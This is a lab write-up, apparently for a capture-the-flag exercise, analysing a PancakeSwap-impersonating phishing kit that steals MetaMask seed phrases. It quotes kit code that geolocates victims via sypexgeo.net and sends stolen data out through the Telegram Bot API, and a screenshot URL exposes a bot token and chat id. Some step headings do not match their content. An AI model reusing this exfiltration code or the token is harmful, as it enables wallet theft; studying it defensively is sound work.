# Threat Intel with GrabThePhisher Lab

## Objective
This lab scenario involves an attacker compromising a server and impersonating PancakeSwap, a decentralized exchange native to BNB Chain, to host a phishing kit at https://apankewk.soup.xyz/mainpage.php. The attacker set it as an open directory with the file name "pankewk.zip". Provided the phishing kit, you, as a SOC analyst, are requested to analyze it and conduct your threat intel homework.

### Skills Learned

- **Phishing Analysis:** Identifying and analyzing phishing kits and tactics.
- **MITRE ATT&CK Techniques:** T1567, T1016, T1566.003
- **Forensic Investigation:** Investigating malicious files to uncover attack details and attacker identities.
- **Open Directory Exploitation:** Recognizing and exploiting open directories to gather critical information.
- **Open Source Intelligence (OSINT):** Using publicly available tools and data to gather information about the phishing kit and the attacker.

### Tools Used

- Operating System: Basic Windows operations for file management and system navigation.

## Steps

1. **Network Configuration**:
     * First, we unzip the given file to look at the following directories. Inspecting the contents will give us more information to find the phisher trying to impersonate the PancakeSwap Finance website.
     * We see interesting folders like 'metamask', 'src', and 'log'.
       
      ![image alt](https://github.com/HemantVarunParas/GrabThePhisher-CTF-Lab/blob/b6dad4515d3b5a78bcd9cfd07609bc3a68a4e48f/IMG/pankewk%207_12_2024%205_11_11%20PM.png)
  
2. **Scanning for Open Ports**:
   * We see HTML and PHP files Inside the 'metamask' folder. Opening 'metamask.php' will reveal tons of information and answer the following questions asked in the lab.

     ![image alt](https://github.com/HemantVarunParas/GrabThePhisher-CTF-Lab/blob/b6dad4515d3b5a78bcd9cfd07609bc3a68a4e48f/IMG/pankewk%207_12_2024%205_11_38%20PM.png)
     ![image alt](https://github.com/HemantVarunParas/GrabThePhisher-CTF-Lab/blob/ccb9ca5df0de7bdf06697b48c9625fa92c691f5e/IMG/metamask.php%20-%20Notepad%207_12_2024%205_13_25%20PM.png)
     
       *  In the '"<b>Wallet:</b> Metamask", we see that the wallet being used is MetaMask.
       *  "$request = file_get_contents '(HTTP: //api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR'])' shows that sypexgeo.net/ is the kit used to retrieve the victim's machine information.
       *  In the final line of codes it shows all gathered data stored in the root directory of the webpage in the log directory is stored in the log.txt file. Checking the file, we have three lines of different 12-word seed phrases.
         ![image alt](https://github.com/HemantVarunParas/GrabThePhisher-CTF-Lab/blob/ccb9ca5df0de7bdf06697b48c9625fa92c691f5e/IMG/log.txt%20-%20Notepad%207_12_2024%205_20_01%20PM.png)
       *  "$filename= https: //api.telegram.ord/bot ..." shows that the script is using the Telegram Bot API as a medium to deliver information.
       *  To grab the full name of the phisher, we have to use the Telegram API to gather information about the phishing actor. Using api.telegram.org will evoke a response that includes various details about the chat, including the full name of the user and their username.
         ![image alt](https://github.com/HemantVarunParas/GrabThePhisher-CTF-Lab/blob/ccb9ca5df0de7bdf06697b48c9625fa92c691f5e/IMG/api.telegram.org_bot5457463144_AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10_getChat_chat_id%3D5442785564%20-%20Google%20Chrome%207_12_2024%205_24_29%20PM.png) 
   
## Conclusion
This project lab taught me hands-on experience analyzing a phishing kit targeting PancakeSwap. The analysis unveiled intricate details about the attacker's methods and infrastructure. By examining the provided files and directories, I gained invaluable insights into the attacker's tactics and the sophisticated tools employed in the phishing campaign.

